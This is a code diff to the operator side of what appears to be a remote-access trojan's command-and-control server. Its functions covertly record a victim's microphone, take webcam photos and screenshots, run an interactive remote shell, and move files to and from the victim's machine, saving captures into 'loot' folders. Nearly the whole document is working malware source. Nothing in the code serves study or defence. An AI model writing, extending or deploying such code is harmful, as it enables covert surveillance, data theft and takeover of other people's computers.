@@ -1,11 +1,10 @@
 from .system import system
 from .options import *
-from core.server.comm import send_data, recv_data
+from core.server.async_comm import send_data, recv_data
 from core.utils.paths import ensure_project_dir, get_project_path
 from colorama import Fore
 from agent.post_exploit.post_exploit_controller import PostExploitController
 from api.connection_protocol import create_task
-import base64
 import random, os, simplejson
 
 post_exploit_controller = PostExploitController()
@@ -15,13 +14,8 @@ def send_task(conn, address, module, action, args=None):
     """Send a JSON task to the agent using the connection protocol."""
     session_id = f"{address[0]}:{address[1]}" if address else ""
     task = create_task(session_id, module, action, args or {})
+    # send_data accepts str and will encode
     send_data(conn, task)
-    return task
-
-
-def send_task_and_wait(conn, address, module, action, args=None):
-    send_task(conn, address, module, action, args or {})
-    return json_receive(conn)
 
 
 def send_notification(conn, address):
@@ -70,142 +64,134 @@ def json_send(conn, data):
         print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
 def geo(conn, address):
-    resp = send_task_and_wait(conn, address, "geo", "get")
-    data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    send_task(conn, address, "geo", "get")
+    try:
+        resp = json_receive(conn)
+        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    except Exception:
+        data = {}
     print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
     input("OK")
 
-
 def secinfo(conn, address):
-    resp = send_task_and_wait(conn, address, "secinfo", "get")
-    data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    send_task(conn, address, "secinfo", "get")
+    try:
+        resp = json_receive(conn)
+        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    except Exception:
+        data = {}
     options.printSecurityInfoText(data)
     input("OK")
 
-
 def sysinfo(conn, address):
-    resp = send_task_and_wait(conn, address, "sysinfo", "get")
-    data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    send_task(conn, address, "sysinfo", "get")
+    try:
+        resp = json_receive(conn)
+        data = resp.get('result') if isinstance(resp, dict) and 'result' in resp else resp
+    except Exception:
+        data = {}
     print(options.getSystemInfoText(data))
     input("OK")
-
 
 def mic(conn, address):
     records_dir = ensure_project_dir("storage", "loot", "records")
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
-    resp = send_task_and_wait(conn, address, "audio", "record", {"duration": 5, "sample_rate": 44100})
-    data = resp.get('result', {}).get('data') if isinstance(resp, dict) else None
-    if data:
-        payload = base64.b64decode(data)
-        output_path = os.path.join(records_dir, f"record{number}.wav")
-        with open(output_path, "wb") as f:
-            f.write(payload)
-        print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: {output_path}")
-    else:
-        print(Fore.LIGHTRED_EX + "[-] Failed to record audio")
+    send_data(conn, b"MODE_MIC")
+    data = recv_data(conn, decode=False)
+    output_path = os.path.join(records_dir, f"record{number}.wav")
+    with open(output_path, "wb") as f:
+        f.write(data)
+    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: {output_path}")
     input("OK")
-
-
 def getInput(conn):
-    return ""
-
-
+    send_data(conn, b"SHELLINFO")
+    return recv_data(conn)
 def shell(conn, address):
+    send_data(conn, b"MODE_SHELL")
     try:
         while True:
-            cmd = input("$ ")
+            send_data(conn, b"SHELLINFO")
+            prompt_text = recv_data(conn)
+            cmd = input(prompt_text)
             if not cmd.strip():
                 continue
             if cmd == 'exit':
                 system.clear_screen()
-                send_task_and_wait(conn, address, "shell", "exec", {"command": cmd})
+                send_data(conn, b"exit")
                 break
+            send_data(conn, cmd.encode())
             if cmd == 'clear':
                 system.clear_screen()
-                continue
-            resp = send_task_and_wait(conn, address, "shell", "exec", {"command": cmd})
-            output = resp.get('result', {}).get('output') if isinstance(resp, dict) else resp
-            if output is None:
-                output = resp
-            print(Fore.LIGHTGREEN_EX + str(output))
+            try:
+                output = recv_data(conn)
+                print(Fore.LIGHTGREEN_EX + output)
+            except Exception as e:
+                print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
+                input("OK")
+                break
     except Exception as e:
         print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")
         input("OK")
 
-
 def upload(conn, address, path=None, name=None, usename=True, send_mode=True):
     path = path or input("File Path: ")
     if usename: name = name or input("Destination File Name: ")
-
+        
     try:
         with open(path, 'rb') as f:
-            payload = base64.b64encode(f.read()).decode('utf-8')
-        args = {
-            "filename": name or os.path.basename(path),
-            "data": payload,
-        }
-        response = send_task_and_wait(conn, address, "file", "upload", args)
-        if isinstance(response, dict) and response.get('status') == 'success':
-            print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
-        else:
-            print(Fore.LIGHTRED_EX + "[-] File upload failed")
+            data = f.read()
+        if send_mode: send_data(conn, b"MODE_UPLOAD")
+        if usename: send_data(conn, name.encode())
+
+        if send_mode: control = recv_data(conn)
+        send_data(conn, data)
+        print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
     except Exception as error:
         print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
         input("OK")
     if send_mode: input("OK")
-
-
+    
 def download(conn, address):
+    send_data(conn, b"MODE_DOWNLOAD")
     path = input("File Path: ")
     name = input("Destination File Name: ")
+    send_data(conn, path.encode())
     try:
-        response = send_task_and_wait(conn, address, "file", "download", {"path": path, "filename": name})
-        data = response.get('result', {}).get('data') if isinstance(response, dict) else None
-        if not data:
-            raise ValueError("No data returned")
+        send_data(conn, b'control')
+
+        data = recv_data(conn, decode=False)
         with open(name, 'wb') as f:
-            f.write(base64.b64decode(data))
-        print(Fore.LIGHTCYAN_EX + "[+] File Downloaded")
-    except Exception as error:
+            f.write(data)
+    except Exception as error: 
         print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
         input("OK")
     input("OK")
-
 
 def cam(conn, address):
     photos_dir = ensure_project_dir("storage", "loot", "photos")
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
-    response = send_task_and_wait(conn, address, "camera", "capture")
-    data = response.get('result', {}).get('data') if isinstance(response, dict) else None
-    if data:
-        payload = base64.b64decode(data)
-        output_path = os.path.join(photos_dir, f"photo{number}.jpg")
-        with open(output_path, "wb") as f:
-            f.write(payload)
-        print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: {output_path}")
-    else:
-        print(Fore.LIGHTRED_EX + "[-] Failed to capture photo")
+    send_data(conn, b"MODE_CAM")
+    data = recv_data(conn, decode=False)
+    output_path = os.path.join(photos_dir, f"photo{number}.jpg")
+    with open(output_path, "wb") as f:
+        f.write(data)
+    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: {output_path}")
     input("OK")
-
 
 def screenshot(conn, address):
     photos_dir = ensure_project_dir("storage", "loot", "photos")
     try:
         number = random.randint(0, 9999999)
         print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
-        response = send_task_and_wait(conn, address, "desktop", "screenshot")
-        data = response.get('result', {}).get('data') if isinstance(response, dict) else None
-        if data:
-            payload = base64.b64decode(data)
-            output_path = os.path.join(photos_dir, f"screenshot{number}.png")
-            with open(output_path, "wb") as f:
-                f.write(payload)
-            print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: {output_path}")
-        else:
-            print(Fore.LIGHTRED_EX + "[-] Screenshot failed")
-    except Exception as e:
+        send_data(conn, b"MODE_SCREENSHOT")
+        data = recv_data(conn, decode=False)
+        output_path = os.path.join(photos_dir, f"screenshot{number}.jpg")
+        with open(output_path, "wb") as f:
+            f.write(data)
+        print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: {output_path}")
+    except Exception as e: 
         print(e)
         input("OK")
     input("OK")
